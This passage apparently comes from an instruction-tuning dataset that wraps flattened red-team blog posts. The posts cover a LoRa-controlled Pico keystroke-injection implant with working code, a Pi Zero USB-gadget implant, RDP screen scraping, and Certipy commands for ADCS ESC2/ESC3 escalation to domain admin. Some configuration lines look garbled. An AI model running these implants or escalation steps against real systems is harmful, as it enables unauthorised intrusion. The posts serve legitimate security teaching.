lorapi LoRa 20Pi 20Zero 20Mk 202.jpg igitalconcepts.net.au pcbs content support lorapi LoRaPi-0-16 20Top.png I immediately downloaded the design files and sent an order for 10 PCBs and waited for them to arrive Once they finally arrived from China I whipped out the tape of RFM 95 modules sitting on my desk and started assembling a couple In the assembly instructions there is a basic configuration that is mentioned and if you plan to replicate this setup that is all you need PCB LoRa Module 2x8 header and an antenna connector SMA or u.fl Pretty simple stuff After soldering up the first set of boards and connecting them to a Pi Zero I couldn't get them to work The radio would just never configure itself over SPI and it errored out indicating there could be a wiring issue This was the same as the second one I tried UGH A little troubleshooting later I determined that I needed to use the CE1 chip selection pin instead of CE0 for some reason on the Pi Zero Simple enough I just need to desolder the solder jumper on the LoRaPi breakout board from CE0 and resolder the chip select NSS jumper pad to the CE1 pin on the header Once I did this everything worked just as expected Example Solder Jumper from CE1 to NSS pad Here is a completed LoRaPi module with 2x8 pin header to connect to Pi LoRaPi Breakout Board w SMA Here is an example of the LoRaPi module connected to a Pi Zero W with 5dBI antenna attached If you build one of these devices to play around with I do recommend that you use a 2x8 pin header so that you can easily remove the module from your Pi if you want to repurpose the Pi Otherwise if you are looking to make a more permanent version you can solder the module directly to the header pins of the Pi I found that the black plastic portion on the header was just tall enough to provide clearance for the LoRaPi module to sit flush with it and not touch the second Micro USB port on the Pi Zero W I did put a layer of Kapton tape on the bottom of the PCB just in case but it really is not needed Just enough clearance when soldered directly to Pi Zero So there you have it a Pi Zero W with USB OTG and LoRa RFM95 module for out-of-band communication Stayed tuned for the next blog in this series focusing on the software for configuring and using the RFM95 LoRa Module Footnotes"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Offensive IoT for Red Team Implants (Part 2)</title>\n<taxonomies>Hardware Hacking, How-To, Informational, Physical, Red Team, Red Team Tools, Tim Fowler</taxonomies>\n<creation_date>Thu, 16 May 2024 15:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "This is Part Two of the blog series Offensive IoT for Red Team Implants so if you have not read PART ONE I would encourage you do to so first and then come back here In this blog we are going take a from the ground up approach to getting a Raspberry Pi Pico Pico W set up and running as a physical implant device for attacks such as USB Rubbery Ducky Then we will pivot slightly and extend the capability for the implant device by enabling and using a bolted-on LoRa module to take the entire attack process to level 11 Let's dive in You are going to need to have some basic hardware accessible to you mainly a Raspberry Pi Pico or Pico W which I will just reference as a Pico from here on out and a micro USB cable You also need a computer but I am assuming that was a given Getting Started To get started you will need to set up the environment for the configuring and programming of your Pico For this blog series we are going to be using CircuitPython1 as our language of choice There are many options available for the Pico platform including C C and Arduino but for this use case Circuit Python is a pretty solid choice with its ease of use and preexisting libraries You are also going to need some sort of IDE to develop your code in For this blog we are going to use Thonny IDE which touts itself as a Python IDE for beginners.2 You don't have to use Thonny there are many IDEs out there to choose from but for the purpose of keeping it simple that is what we will use Thonny IDE First you need to download Thonny from the website honny.org Thonny is cross-platform compatible so whether you are running on Windows a Mac or Linux you should not have any issues After you have downloaded the installer for your OS of choice you then need to install Thonny by executing the installer I happened to be on a Windows system while authoring this blog so below is a screenshot of what the install looks like on Windows Once you have Thonny installed you are ready for the next steps installing Circuit Python on your Pico Circuit Python To get your Pico running with CircuitPython you need to first download the version of CircuitPython that corresponds to the Pico you have In my case I am using a Pico W but you could also be using just a Pico or possibly one of the 495 boards CircuitPython supports While this blog is based on the Pico and Pico W it's important to note that this process should work with any RP2040-based board but your milage may vary After selecting your board on the CircuitPython Download page you will be taken to a page where you can download the CircuitPython firmware file a .UF2 file for your chosen board Download the latest stable release firmware file to your computer at the time of this writing it was 9.0.4 Once you have downloaded the .UF2 file you can then connect your Pico to your computer using a micro USB cable I would suggest you first plug the micro USB end of the cable into the Pico WITHOUT the other end of the USB cable being plugged into your computer The reason for this is that you will need to hold down the BOOTSEL button on the Pico when powering up to install CircuitPython and that is a lot easier to do if you use one hand to hold the button down and the other to connect the USB cable to your computer After powering up the Pico with the BOOTSEL button being held down the Pico should present as a drive on your computer and should be named RPI-RP2 or something similar Now you will want to find where you downloaded the firmware file You are going to need to copy it to the new drive on your computer After successfully copying the firmware file to the drive it should automatically disconnect from your host and then reconnect after a few moments which at that point you should have a new drive appear called CIRCUITPY If you have this new drive mounted on your computer you have successfully installed CircuitPython on your Pico and are ready for the next steps Now you need to open the Thonny IDE In doing so it should automatically connect to the COM port where your Pico is attached in my case it was COM9 but yours may be different If it does not automatically connect to your Pico's COM port you can manually select which COM port you would like to connect to using the menu in the lower right corner of the Thonny IDE In Thonny you need to install some packages so do this click on Tools and then Manage packages When the Manage Packages screen opens you need to search for the following adafruit-circuitpython-hid and then click the search button on the right You should get a single result click on it and then click 'Install at the bottom of the screen Now you should have everything configured and ready to start writing some code to make your Pico something slightly more sinister Write Some Code The next step is for you to open the file code.py that is on your Pico To do this you can click on the folder icon in the menu bar and then select the bottom option CircuitPython device Then a file prompt will open and you can select code.py You may find that your code.py already has something in it like print Hello World but no worries you can delete that and then copy the following code into the file import time import board import usb_hid from adafruit_hid.keyboard import Keyboard from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS from adafruit_hid.keycode import Keycode Setup for keyboard emulation keyboard Keyboard usb_hid.devices layout KeyboardLayoutUS keyboard Function to perform a combination of key presses def press_keys keys delay 0.1 keyboard.press keys time.sleep delay keyboard.release_all time.sleep 2 Delay to make sure the device is connected before trying to injection keystrokes Open a web browser press_keys Keycode.GUI Keycode.R Windows key R to open run dialog layout.write 'ww.youtube.com watch?v dQw4w9WgXcQ themeRefresh 1 n Click on the Save icon to save the file and then hit F5 or the green run button to test your code If everything worked as expected you should have had a web browser open and everyone's favorite YouTube video started playing If that did not work for you there are a couple of reasons why that may be the case First the code you ran was written to be executed on a Windows-based PC If you are doing your development on something other than Windows you would need to connect your Pico with your code running to a Windows PC to see if it worked Secondly there could have been an error in your copy-and-paste process so double check the code and use the error messages in the Thonny console to help you diagnose the issue Assuming it all did work for you the code you just ran is not exceptionally evil as you can see What you have done is performed a keystroke injection attack using Python Hard Not really Impressive Again not really However this lays the groundwork for a very powerful keystroke injection platform but this is currently about the absolute most basic thing you can do with this approach We need to do more Let's start by installing a new library called Adafruit-circuitpython-ducky within Thonny IDE To do this click on Tools Manage packages and then search for the package by name and install This package allows us to use pre-written Ducky Script payloads and have them execute via our Python code This is super effective as it allows one to use the plethora of existing payloads without the need to write each one from scratch Once you have the ducky package installed you can modify your code.py file with the following contents to leverage the library import time import usb_hid from adafruit_hid.keyboard import Keyboard from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS import adafruit_ducky time.sleep 2 Sleep for a bit to avoid a race condition on some systems keyboard Keyboard usb_hid.devices keyboard_layout KeyboardLayoutUS keyboard We're in the US duck adafruit_ducky.Ducky 'duckyscript.txt keyboard keyboard_layout result True while result is not False result duck.loop What the previous code does is open a file called duckscript.txtand iterates over it injecting each line within the script as keystrokes on the target computer But to dothis we need a payload file so let's generate that now Create a new file within Thonny called duckyscript.txt add the following text and save it to the device as duckyscript.txt WINDOWS r DELAY 500 STRING ww.youtube.com watch?v dQw4w9WgXcQ ENTER The DuckyScript3 code you just saved to a file does the exact same thing as the previous Python code but is much simpler to read and write Now run your code.py by clicking on the Run icon or hitting F5 You should get the same result as previously but with code that is a lot more reusable At this point you can replace duckscript.txt with any DuckyScript payload and your Pico should be able to run it just fine You have now created a simple USB rubber ducky-style implant device using Pico and some Python code but I think if you have made it this far you are expecting a little more than a simple replication of existing abilities Teaching a Rubber Duck to Fly So while the code works and does allow us to use a Pico as a USB rubber ducky that is still a pretty limited use case because as it is we really only have the ability to run the single duck script Yes we could create another loop that would then execute additional duck scripts but that forces you to really plan and load everything you need ahead of time What if you can opt to run additional scripts later and even add new scripts That would be something wouldn't it Well there are devices out there than can do this already using with Wi-Fi or Bluetooth but the issue with that approach is that one those mechanisms have a limited range and two they can easily be detected Thirdly that's just not as fun as what we are about to do IoT Enters the Room Okay so let's level set for just a moment we are not really using IoT devices for physical implants but rather we are going to leverage one of the common IoT communication methods in this case LoRa I talked about some of the reasons why this is a good and interesting option in the previous blog post so if you want to understand the why of LoRa go back and read it Completed Pico-LoRa PCB in Acrylic Case To do this I am using a custom PCB that has a Pico W and RFM95 LoRa module on it but you don't need custom hardware as you can buy an off the shelf solution like the Adafruit Feather RP2040 with RFM95 ww.adafruit.com product 5714 which is effectively the same hardware I am using in a prebuilt package Also it is vital to note that you will need TWO devices to be able to perform this Over-The-Air OTA Rubber Ducky attack one device as your implant and one device that will act as your sender For my purposes I am just using two of the custom PCBs but you could use two of the Adafruit Feathers or any other supported devices if the LoRa modules are the same and the same configuration for said modules is used Implant Code We are going to start with the code for the implant device first We need to add one more library to our device so that we can use the attach LoRa module In this case we are going to use the Adafruit-circuitptytthon-rfm9x library that can be installed in the same manner as the other libraries Once you have installed the library you can open up the code.py file on your implant device in Thonny and copy the following code There is no need to understand 100 of what is happening in the code but at a high level the code sets the type of HID to present as as well as the keyboard layout we want to use Then it does some LoRa module configuration followed by defining the function to receive a script from over the air a function to execute said script as well as defining main import time import board import busio import digitalio import usb_hid from adafruit_hid.keyboard import Keyboard from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS import adafruit_rfm9x import adafruit_ducky Initialize keyboard keyboard Keyboard usb_hid.devices keyboard_layout KeyboardLayoutUS keyboard Initialize SPI connection spi busio.SPI board.GP2 MOSI board.GP3 MISO board.GP4 Your SPI Pins may be different Configure RFM95 CS and RESET pins cs digitalio.DigitalInOut board.GP5 reset digitalio.DigitalInOut board.GP6 Initialize RFM9x rfm9x adafruit_rfm9x.RFM9x spi cs reset 915.0 Adjust frequency to match your region rfm9x.tx_power 13 Default transmission Power rfm9x.signal_bandwidth 250000 250000 Set signal bandwidth rfm9x.coding_rate 5 Set coding rate 4 5 4 6 4 7 4 8 rfm9x.spreading_factor 7 Set spreading factor 6 to 12 rfm9x.node 255 Function to receive scripts and write them to a file def receive_scripts print Waiting for new scripts via LoRa with open 'lora_script.txt 'w as file Open file in write mode while True packet rfm9x.receive timeout None Block indefinitely until a packet is received if packet is not None script_line str packet 'utf-8 .strip Decode packet text print Received line script_line if script_line 'DNE Check for termination string print End of script received break Exit the loop to process the script file.write script_line n Write each line to the file else pass print No packet received continuing to listen Function to execute the script def execute_script filename duck adafruit_ducky.Ducky filename keyboard keyboard_layout result True while result is not False result duck.loop Main function to handle script reception and execution def main time.sleep 2 execute_script 'duckyscript.txt while True receive_scripts execute_script 'lora_script.txt main When this code is run on the Pico it will first execute the script duckyscript.txt as the default script after a short delay of 2 seconds to make sure the host is ready This initial script could be anything you want it to be but in our case I have left it unmodified Then after running the default script the Pico enters a loop where it will listen for any new scripts coming in over LoRa Once the entire script has been received it is saved to the Pico's filesystem and then executed and the loop repeats waiting for the next script to come in If you were able to send a new script over LoRa to the implant it would fail because as it stands the file system is not writable To change this you need to create a new file with the following contents and then save it as boot.py import storage storage.remount readonly False This code will allow CircuitPython to be able to write to the filesystems and save any script received over LoRa You now have your implant ready to go Disconnect it from your host for now Thonny can get temperamental trying to configure multiple devices at the same time so its better to just have one device at a time connected Sender Code Now for the sending side of the equation First you will want to connect your second device to your computer and select the appropriate COM port in Thonny Next you will need to install the necessary libraries which should only be adafruit-circuitptytthon-rfm9x All other dependencies will be installed with the RFM9x library After installing the RFM9x library you can open code.py and copy the following code into it import time import board import busio import digitalio import adafruit_rfm9x Serial setup import usb_cdc serial usb_cdc.data Initialize SPI connection spi busio.SPI board.GP2 MOSI board.GP3 MISO board.GP4 Configure RFM95 CS and RESET pins cs digitalio.DigitalInOut board.GP5 reset digitalio.DigitalInOut board.GP6 Initialize RFM9x rfm9x adafruit_rfm9x.RFM9x spi cs reset 915.0 Adjust frequency to match your region rfm9x.tx_power 13 Default transmission rfm9x.signal_bandwidth 250000 250000 Set signal bandwidth rfm9x.coding_rate 5 Set coding rate 4 5 4 6 4 7 4 8 rfm9x.spreading_factor 7 Set spreading factor 6 to 12 rfm9x.node 255 Function to receive from serial and send over LoRa def receive_and_transmit while True print Waiting for data line serial.readline .decode .strip This should block until a line is received if line print Received from serial line rfm9x.send bytes line 'utf-8 print Sent over LoRa line receive_and_transmit This code is pretty simple as it sets up the LoRa module configuration and then listens to the serial port for data that then gets transmitted over LoRa Next you will need to create boot.py file on this device with the following content import usb_cdc usb_cdc.enable console True data True In order for the boot.py code to work you will need to fully disconnect your second device and reconnect it What this code is doing is creating a second serial port on the device that allows us to monitor what is happening in Thonny as well as sending data to the secondary serial port for it to be transmitted I call this a development quality of life configuration Send to Sender Code With the device code completed the last thing we need to do is create some client code that can send a ducky script file over serial to the sender device for transmission On your host create a file called sender.py and save the following contents to it import serial import time Configure your serial connection serial_port 'COM14 This will vary based on your operating system and setup baud_rate 115200 Make sure this matches the baud rate on your Pico def send_script filename try with serial.Serial serial_port baud_rate timeout 1 as ser with open filename 'r as file for line in file print Sending line.strip ser.write line.encode b n time.sleep 0.5 Give the Pico time to process and send the line ser.write b'DNE n Termination Line for EOF except serial.SerialException as e print Error opening or using the serial port e send_script 'duckyscript.txt You will need to update the serial_port value on line 5 to match that of the serial port on your host Remember now the device will present two serial ports to your host in my case COM13 and COM14 COM14 is the secondary serial port in my setup but you may have to try a couple of different values depending on your setup This code simply reads in the contents of the file duckscirpt.txt and then sends it line by line over to the sender device for transmission When the end of the file is reached a single line of DNE n is written to the serial interface indicating the EOF Save the code Lastly you need to save a payload on your host called duckyscript.txt with whatever Ducky Script payload you want Here I am using this simple payload that launches the Task Manager as a proof-of-concept CONTROL SHIFT ESC Save the code and you should be ready to go and fly our first rubber ducky over the air Execution Time To launch the attack you will first need to deploy your implant device by connecting it to the target PC Then from your attacking host connect the sender device to your host configure your sender.py script with the correct COM port and fire away with the command python3 sender.py Using a software-defined radio dongle like the RTL-SDR and a utility like SDR you can see the LoRa packets being transmitted over the airwaves On the target device Task Manager should be running on the screen Just as we planned it If all worked well your victim should have not only gotten Rick-Rolled but also fallen victim to a flyby rubber ducky attack Footnotes"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Introducing Squeegee: The Microsoft Windows RDP Scraping Utility</title>\n<taxonomies>David Fletcher, Informational, Red Team, Red Team Tools</taxonomies>\n<creation_date>Fri, 17 May 2024 16:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Hi it's David with BHIS You'll be saying Wow every time you use this tool It's like a shammy It's like a towel It's like a sponge A regular towel doesn't work wet This works wet or dry This is for the house the car the boat the RV It's Squeegee Holds 12 times its weight in liquid Look at this It just does the work Why would you want to work twice as hard It doesn't drip It doesn't make a mess Just kidding Squeegee won't clean up your messes but hopefully you will find it useful on your tests Squeegee is actually a tool to scrape text from RDP screen captures You are probably asking yourself why that might be useful We are constantly thinking about ways to get information using unconventional techniques Imagine that you are on an internal penetration test and you want to know what the local administrator account username is on hosts but you have hundreds or thousands of RDP listeners on the network How might you approach that problem Next consider a situation where you might want to get active session information from the environment in an effort to move laterally and escalate privileges Bloodhound session data isn't as reliable as it used to be and in modern Windows environments session enumeration tends to get caught What about cataloging users with active RDP sessions Example RDP Logged In Users Squeegee can help in both of these situations The first step is to collect RDP screen captures using a tool like NCC Group's scrying Once you have the RDP screen captures you can process the entire group of results using Squeegee by just pointing the tool at the correct folder Squeegee Execution Squeegee will filter string content that is not likely to be useful in the context of username harvesting and system analysis In addition the tool will interpret various strings commonly observed in RDP image output to identify the operating system the domain the computer is joined to and whether the system is missing patches Reporting options include console output logfile output and an HTML report The HTML report organizes results by operating system and includes links to download the full list of unique usernames and usernames associated with a given RDP instance Squeegee HTML Report Table of Contents Squeegee Sample Results Squeegee uses the easyocr library for OCR support As a result text can be extracted from images with support for 81 different languages This provides an easy method to process an image like the one shown below RDP Screen Capture with Non-Latin Characters Without OCR support reproducing strings presented on the screen may take considerable effort Passing in the ISO language code to the script will cause easyocr to process strings associated with the target language Once the images have been processed usernames can be copied and pasted from the report or downloaded in the accompanying text file Non-Latin Strings Extracted from RDP Screen Capture Check out the Squeegee repository at ithub.com OOAFA squeegee"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Offensive IoT for Red Team Implants (Part 3)</title>\n<taxonomies>Hardware Hacking, How-To, Informational, Physical, Red Team, Red Team Tools, Tim Fowler</taxonomies>\n<creation_date>Thu, 23 May 2024 14:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "This is part three of the blog series Offensive IoT for Red Team Implants We will be building off from where we left off in the last post which can be found here PART TWO If you have not already read the previous blog posts I would encourage you to do so first and then come back here In the last post we walked through how to use a Raspberry Pi Pico as a USB rubber duck and extended its capability using an attached LoRa modem to allow for over-the-air execution of DuckyScript files In this post we are going to go one step further using everything we have learned thus far and ramping it up to 11 If you recall in the first blog of this series I showed an example of Raspberry Pi Zero W with a RM95 LoRa module attached to the header pins Well we are going to use that setup as hardware for the remainder of this post along with one of the custom Pico LoRa PCBs from the previous blog post but that could easily be substituted for an Adafruit Feather RP2040 with LoRa or the like Below is the hardware that will be used Implant Hardware Raspberry Pi Zero W USB Dongle Boarb for Pi Zero RFM95 LoRa Module on Breakout board 915MHz u.fl Antenna Operator Hardware Pico-LoRa Breakout Board Or Adafruit Feather RP2040 with LoRa ww.adafruit.com product 5714 One note on the USB Dongle board for the Pi Zero there are multiple options but far and away my preferred version is the Geek Pi USB Dongle Expansion Board which can be bought on Amazon for about 11 ww.amazon.com GeeekPi-Dongle-Expansion-Raspberry-Inserted dp B098JP79ZX There are other options as I said I have tried most of them and all do work for this purpose The entire objective of these USB boards is to provide the ability to connect the implant over a USB Type A port like you would a USB drive instead of needing cables to power the Pi and transfer data For the remainder of this blog post we are going to focus on configuring the Pi Zero so that it presents itself to a target computer as a USB ethernet device and automatically assigns it an IP address so that the implant and the host can communicate over TCP IP In my opinion this is the hardest but most critical part of the setup in using a Pi Zero as a physical implant Unlike the Raspberry Pi Pico which is rather limited having the full-fledged Linux computer as your implant is a very powerful tool and having the ability to have the host communicate back to the implant is imperative for this to maximize the potential of the platform Diving In Once you have your hardware ready you will need to install an OS on a MicroSD card I would recommend using Raspbian as well as the Raspberry Pi Imager software to install the OS on the card When doing this it's advised that you enable SSH and configure Wi-Fi as it will make it easier to just plug the Pi Zero W into your host and get started After the SD card is ready insert into the slot and plug your USB Dongle into a computer After some time it should power up and you should be able to SSH into it using the credentials you set during installation and .local with the hostname that was set up during installation Once you're connected to the Pi Zero make sure all updates are installed before making changes to the configuration First you will need to modify the config.txt file located at boot config.txt and add the following line at the end dtoverlay dwc2 This configuration option enables USB gadgets that will be leveraged shortly Next reboot your Pi Zero using the sudo reboot command so that USB gadgets will be enabled After you have rebooted connect back to your Pi Zero where you will need to create a script that will do most of the heavy lifting in the configuration of your USB gadget The script here is almost an exact copy of what can be found in this blog post on.sprig.gs blog post 2243 I would encourage you to read it as the author does a wonderful job explaining the WHY for everything not just with this script but for most of the process that follows I have made some modifications to the author's code to simplify things for our needs but give all credit to Jon The Nice Guy Spriggs What you need to do is copy the following script into a file located at opt implant.sh using the following command Sudo nano opt implant.sh bin bash Based on a combination of ww.isticktoit.net ?p 1383 and ww.raspberrypi.org forums viewtopic.php?t 260107 and ist.github.com schlarpc a327d4aa735f961555e02cbe45c11667 c80d8894da6c716fb93e5c8fea98899c9aab8d89 and ithub.com ev3dev ev3-systemd blob 02caecff9138d0f4dcfeb5afbee67a0bb689cec0 scripts ev3-usb.sh configfs sys kernel config usb_gadget this configfs Implant Configure values serial grep 'Serial proc cpuinfo head -n 1 sed -E -e 's Serial s s 0000 1 model grep 'Model proc cpuinfo head -n 1 sed -E -e 's Model s s 1 manufacturer Raspberry Pi Foundation The serial number ends in a mac-like address Let's use this to build a MAC address The first binary xxxxxx10 octet locally assigned unicast which means we can avoid conflicts with other vendors mac_base echo serial sed 's w w 1 g cut -b 4 ecm_mac_address_dev 02 mac_base ECM CDC address for the Pi end ecm_mac_address_host 12 mac_base ECM CDC address for the host end that the Pi is plugged into rndis_mac_address_dev mac_base 22 RNDIS address for the Pi end rndis_mac_address_host 32 mac_base RNDIS address for the host end that the Pi is plugged into Make sure that libComposite is loaded libcomposite_loaded lsmod grep -e libcomposite 2 dev null -z libcomposite_loaded modprobe libcomposite while -d configfs do sleep 0.1 done Make the path to the libComposite device mkdir -p this echo 0x0200 this bcdUSB USB Version 2 echo 0x1d6b this idVendor Device Vendor Linux Foundation echo 0x0104 this idProduct Device Type MultiFunction Composite Device echo 0x02 this bDeviceClass This means it is a communications device Device Version this seems a bit high but OK This should be incremented each time there's a breaking change so that it's re-detected rather than cached apparently echo 0x4000 this bcdDevice The OS_Desc config must specify a valid OS Descriptor for correct driver selection See ww.kernel.org doc Documentation ABI testing configfs-usb-gadget Once you have saved that file you will need to make it executable using the command sudo chmod x opt implant.sh Next you need to create a service to run the script automatically To do that create a file called Implant.service at lib systemd systems Implant.service I used the following command to do so sudo nano lib system system Implant.service Paste the following script into the file Implant.service Unit Description Start libComposite Service Type oneshot ExecStart opt lib_composite.sh Install WantedBy multi-user.target Save that file and then enable the service using the following command sudo systemctl enable Implant.service Now you will need to reboot your implant Once the implant comes back up and you reconnect to it issue the ifconfig command You should now see two interfaces usb0 and usb1 For reasons that were discussed in the Jon Spriggs blog post linked previously we configured two interfaces but we are only really concerned about the usb1 interface as it is the only interface that will work with a modern Windows host The usb0 interface is for legacy systems and while you may never actually use it we configured two just in case Currently these interfaces do not have any configuration applied to them so that is the next step Create a file in etc network interfaces.d called usb0 and populate it with the following details You can use the command sudo nano etc network interfaces.d usb0 to create the file allow-hotplug usb0 iface usb0 inet static address 192.168.254.2 netmask 255.255.255.0 Save that file and repeat the process for usb1 by creating the file etc network interfaces.d usb1 and saving the following content to it allow-hotplug usb1 iface usb1 inet static address 192.168.255.2 netmask 255.255.255.0 Having configured the interfaces now you need to configure a DHCP service to issue an IP address to your target host For this purpose we are going to use dnsmasq which you will need to install with the following command sudo apt install dnsmasq After the successful installation of dnsmasq you will then need to configure it by editing the dnsmasq configuration file located at etc dnsmasq.conf Using the following command you can create the file and save the code below sudo nano etc dnsmasq.conf interface usb0 interface usb1 bind-interfaces dhcp-range usb0 192.168.254.3 192.0.2.3 2h dhcp-range usb1 192.168.255.3 192.168.255.3 2h dhcp-option option router The configuration you just set in the dnsmasq.conf file is pretty simple but I will provide a high-level overview so that you are not flying blind The first three lines are simply setting interfaces within dnsmasq but the really important stuff is the two dhcp-range lines where the DHCP scopes for each interface is configured and in this case we set the DHCP range to be a single IP address 192.168.25X.3 This allows the target host to receive a single known IP address and that is it The last line effectively tells dnsmasq to not set a gateway router when issuing an DHCP address We need to do this so that you don't interfere with the host's routing for now Next you need to tell dnsmasq not to bind to the localhost You can do this by uncommenting the last line of etc default dnsmasq to say DNSMASQ_EXCEPT lo and saving the file You can do this using the command sudo nano etc default dnsmasq Now dnsmasq is configured you need to create a shell script and a service to start dnsmasq AFTER the interfaces have come up as the dnsmasq configuration requires those interfaces being up as a dependency for the configuration to be applied Create a script at opt dnsmasq.sh and insert the code below using the following command sudo nano opt dnsmasq.sh bin bash set -x systemctl disable --now dnsmasq mv etc init.d dnsmasq etc init.d dnsmasq.initd sed -i -e s Requires network.target Requires network.target sys-subsystem-net-devices-usb0.device sys-subsystem-net-devices-usb1.device -e s etc init.d dnsmasq etc init.d dnsmasq.initd g lib systemd system dnsmasq.service Save the file and make the script executable using the following command sudo chmod x opt dnsmasq.sh Then you need to create a unit file to start dnsmasq at the appropriate time by copying the code below into the file lib systemd system StartDNSMASQ.service and saving it using the following command sudo nano lib systemd system StartDNSMASQ.service Unit Description Start DNSMasq After network-online.target Service Type oneshot ExecStart bin bash -c opt dnsmasq.sh Install WantedBy multi-user.target Next enable the newly created service using the following command sudo systemctl enable StartDNSMASQ.service Now reboot your implant Drumroll Once your implant reboots in a couple of minutes your host computer should register a new Ethernet device which in my case is Ethernet 4 and is designated as a Remote NDIS Compatible Device It should get the IP address 192.168.255.3 if everything worked as expected Note You may get a warning like this one below I have not taken the time to figure out how to avoid this so yeah Sorry It's expected at this point Whew if you made it this far I am happy to tell you the hard part is over Congratulations In part four of this blog series we will pick up from here and finish integrating LoRa out of band communication to create the ultimate physical implant Stay tuned READ PART ONE PART TWO"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Abusing Active Directory Certificate Services (Part 4)</title>\n<taxonomies>Alyssa Snow, Blue Team, External/Internal, General InfoSec Tips & Tricks, How-To, Informational, Red Team</taxonomies>\n<creation_date>Thu, 30 May 2024 15:31:17 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Start this blog series from the beginning here PART 1 Misconfigurations in Active Directory Certificate Services ADCS can introduce critical vulnerabilities into an Enterprise environment In this article we will cover the basics of exploiting escalation techniques ESC2 and ESC3 using Certipy.1 These escalation techniques abuse overly permissive enrollment rights and Extended Key Usage configurations The Extended Key Usage EKU policies define how a certificate can be used Some examples of the available descriptors for the EKU policy are shown in the following screenshot EKU Descriptor Examples Users authorized to request a certificate can be defined on the Certificate Authority itself and in the certificate template object The CA properties can be viewed via the certsrv utility Right Click CA Properties Security CA CSR Descriptor The template permissions for the User template are displayed in the Certificate Template Console as shown below Template Security Permissions ESC2 A certificate template vulnerable to ESC2 is configured with the Any Purpose EKU or without an EKU configuration A template that specifies the Any Purpose EKU can allow an attacker to create a certificate with any purpose such as Code Signing Client authentication etc Such a certificate can be used to authenticate to Active Directory as the user who originally requested the certificate and can be used to sign other certificates Templates vulnerable to ESC2 have the following conditions Low Privilege Users Granted Enrollment Rights Signatures Required 0 Enabled True Requires Management Approval False Any Purpose True OR Extended Key Usage False Example In the following example let's imagine that we have gained a foothold in our target company FOOBAR's internal network and we've compromised the account of a user with the name bspears First let's try to request a certificate on behalf of the domain admin using an existing template Using the Certipy command below we will request a certificate using the default User template on behalf of the domain admin with the username administrator The Certipy arguments required to request the certificate are as follows u username p user's password dc-ip domain controller IP address target target CA Certificate Authority DNS Domain Name System Name ca short CA Name template template name on-behalf-of specifies another entity to request a certificate for certipy-ad req -u 'bspears -p 'REDACTED -dc-ip '10.10.0.10 -target 'dc01.foobar.com -ca 'foobar-CA -template 'User -on-behalf-of 'example administrator As shown in the figure below this request resulted in an error and indicated that a PFX is required Currently we do not have a PFX that can be used to request a certificate on behalf of another user However if bspears can request a certificate using a template configured with an EKU of Any Purpose we can use the resulting PFX to request another certificate on behalf of another domain account Failed to Obtain New Certificate for Administrator To find a certificate vulnerable to ESC2 we can enumerate ADCS configurations with Certipy By specifying the -enabled and -vulnerable flags we can tell Certipy to specifically print out vulnerable templates that are enabled certipy find -u 'bspears -p REDACTED -dc-ip 10.10.0.10 -vulnerable -enabled All conditions for ESC2 are met by the ESC2_User template ESC2_User Template Our compromised user account bspears is a part of the Domain Users group and therefore is authorized to request a certificate using the vulnerable template Using the command below we can request a certificate for bspears certipy-ad req -u 'bspears -p 'REDACTED -dc-ip '10.10.0.10 -target 'dc01.foobar.com -ca 'foobar-CA -template 'ESC2_User'-debug The Certipy results will return the request ID or an Object SID Note these See the Validity Period section for more information Request Certificate for bspears The certificate generated from the request above can now be used to sign new certificates To request a certificate on behalf of the domain admin we will use the -pfx flag and specify the bspears.pfx file certipy-ad req -u 'bspears -p 'REDACTED -dc-ip '10.10.0.10 -target 'dc01.foobar.com -ca 'foobar-CA -template 'User -on-behalf-of 'example administrator -pfx bspears.pfx -debug Take note of the returned request ID or an Object SID Request Certificate for Domain Administrator administrator We now have our certificate for the administrator account we can authenticate as the domain admin In summary due to an overly permissive certificate template configuration we were able to obtain a certificate on behalf of a low-privilege user which we could then use to request a certificate on behalf of a Domain Administrator account ESC3 The Certificate Request Agent EKU can be used to request a certificate on behalf of another domain object Templates vulnerable to ESC3 are configured with this EKU and allow low-privilege users to enroll The ESC3 template requirements are as follows Low-Privilege Users Granted Enrollment Rights Signatures Required 0 Enabled True Requires Management Approval False Certificate Request Agent EKU Example 1 Continuing with our FOOBAR scenario Let's review the Certipy output for ESC3 conditions As shown in the figure below all conditions for ESC3 are met by the ESC3_User_1 template ESC3_User_1 Template Our compromised user account bspears is a part of the 